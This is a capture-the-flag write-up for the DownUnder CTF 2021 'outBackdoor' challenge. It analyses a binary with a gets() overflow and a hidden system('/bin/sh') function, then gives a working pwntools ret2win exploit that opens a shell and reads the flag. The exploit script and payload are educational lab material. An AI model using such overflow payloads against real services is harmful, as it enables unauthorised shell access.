+++
title = "outBackdoor Writeup (DownUnder CTF 2021)"
date = "2021-09-28"
updated = "2024-07-12"
+++


# outBackdoor

> Fool me once, shame on you. Fool me twice, shame on me.
>
> Author: xXl33t_h@x0rXx
>

## Analysis

### checksec

```
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

### Decompile with radare2

```cpp
undefined8 main(void){
    char *s;
    
    sym.buffer_init();
    sym.imp.puts("\nFool me once, shame on you. Fool me twice, shame on me.");
    sym.imp.puts("\nSeriously though, what features would be cool? Maybe it could play a song?");
    sym.imp.gets(&s);
    return 0;
}
```

```
0x00401070    1 43           entry0
0x004010b0    4 33   -> 31   sym.deregister_tm_clones
0x004010e0    4 49           sym.register_tm_clones
0x00401120    3 33   -> 28   sym.__do_global_dtors_aux
0x00401150    1 2            entry.init0
0x00401260    1 1            sym.__libc_csu_fini
0x00401264    1 9            sym._fini
0x00401152    1 67           sym.buffer_init
0x00401040    1 6            sym.imp.setbuf
0x00401200    4 93           sym.__libc_csu_init
0x004010a0    1 1            sym._dl_relocate_static_pie
0x004011d7    1 36           sym.outBackdoor
0x00401030    1 6            sym.imp.puts
0x00401050    1 6            sym.imp.system
0x00401195    1 66           main
0x00401060    1 6            sym.imp.gets
0x00401000    3 23           sym._init
```

There is a `sym.outBackdoor` function in the binary at `0x004011d7`

```cpp
void sym.outBackdoor(void){
    sym.imp.puts("\n\nW...w...Wait? Who put this backdoor out back here?");
    sym.imp.system("/bin/sh");
    return;
}
```

The function just gets us a shell

### Exploit

The exploit should be pretty simple as the binary does not have a lot of protections enabled.

I had an issue where the exploit would work locally, but would result i n`EOF` on the server.

This is due to the stack alignment issue.

A good documentation I refered to is [here](https://ropemporium.com/guide.html)

To fix this issue, I had to add the address of the `sym.outBackdoor` function twice in the payload.

```py
from pwn import *

if args.REMOTE:
    p=remote('pwn-2021.duc.tf',31921)
else:
    p=process('./outBackdoor')

p.recvuntil("song?")

payload="\x90"*24+p64(0x004011d7)+p64(0x004011d7)
p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()
```

```
$ python outbackdoor exploit.py REMOTE
[+] Opening connection to pwn-2021.duc.tf
[*] Switching to interactive mode port 31921: Done



W...w.. Wait? Who put this backdoor out back here? 


W...w.. Wait? Who put this backdoorcout back here?
DUCT {https://www.youtube.com/watch?v=XfR9iY5y94s}$
[*] Interrupted
[*] Closed connection to pwn-2021.duc.tf port 31921
```

#### flag >> `DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}`
